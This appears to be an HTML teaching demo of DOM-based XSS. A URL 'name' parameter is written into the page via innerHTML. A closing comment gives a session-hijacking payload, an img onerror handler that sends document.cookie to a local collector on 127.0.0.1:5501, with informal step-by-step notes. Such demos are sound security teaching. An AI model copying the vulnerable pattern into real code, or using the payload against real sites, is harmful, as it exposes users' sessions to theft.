<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Example</title>
</head>
<body>

<!-- Vulnerable Code -->
<div>
    Welcome, <span id="username"></span>!
 </div>

<script>
    // Function to set a cookie, mostly this will be set from server
    function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
    setCookie("exampleCookie", "Hello, Cookie!", 7);
</script>

<!-- Vulnerable Code -->
<script>
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    document.getElementById('username').innerHTML = `${name}`;
 </script>

</body>
</html>

<!-- 
    1. User session hijacking
    ?name=<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src=\'http://127.0.0.1:5501/cookie?data=\'+document.cookie;document.querySelector(\'body\').appendChild(img);">
    -> inside name we are injecting image tag
    -> if something does-not-exist please send a onError 
    -> the code of onError says that please create a node which is called image and have a image source which is - 'http://127.0.0.1:5501/cookie?data=\'+document.cookie
    -> where you are trying to read your document.cookie, you are executing a js code where you are saying boss get the cookie and pass that cookie into this URL which is getting from 
    -> there was a time where you could actually pass a script tag altogether or probably you can write the js code but nowdays browser are 
        very smart and you can not inject the script tag over here.
-->